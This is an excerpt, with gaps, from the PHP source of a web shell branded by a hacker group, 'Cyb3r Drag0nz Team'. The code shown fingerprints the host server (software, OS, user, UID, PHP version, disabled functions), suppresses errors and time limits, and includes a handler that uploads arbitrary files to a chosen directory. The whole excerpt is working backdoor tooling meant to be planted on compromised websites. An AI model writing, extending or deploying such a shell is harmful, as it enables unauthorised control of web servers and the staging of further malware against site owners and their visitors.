...
<center>
<font face="Bungee" size="5">Cyb3r Drag0nz Team Shell </font></center>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td>
<center><img src="https://i.ibb.co/q1fRr83/Cyb3r-Drag0nz-Team-Newcopy.png" width="450" title="Cyb3r Drag0nz Team" alt="Cyb3rDrag0nz" class="center" />
<br><br><br>
<?php
set_time_limit(0);
error_reporting(0);
...
if (empty($disfunc)) {
	$disf = "<font color='red'>NONE</font>";
} else {
	$disf = "<font color='red'>".$disfunc."</font>";
}

function author() {
	echo "<center><br>Cyb3r Drag0nz Team</center>";
	exit();
}
...
echo "Server : <font color='red'>".$_SERVER['SERVER_SOFTWARE']."</font><br>";
echo "System : <font color='red'>".php_uname()."</font><br>";
echo "User : <font color='red'>".@get_current_user()."&nbsp;</font>( <font color='red'>".@getmyuid()."</font>)<br>";
echo "PHP Version : <font color='red'>".@phpversion()."</font><br>";
...
if (isset($_POST['upwkwk'])) {
	if (isset($_POST['berkasnya'])) {
		...
		if (file_exists($lokasi."/".$_FILES['berkas']['name'])) {
			echo "File Uploaded ! &nbsp;<font color='red'><i>".$lokasi."/".$_FILES['berkas']['name']."</i></font><br><br>";
		} else {
		...
		if (file_exists($lokasi."/".$_POST['namalink'])) {
			echo "File Uploaded ! &nbsp;<font color='red'><i>".$lokasi."/".$_POST['namalink']."</i></font><br><br>";
		} else {
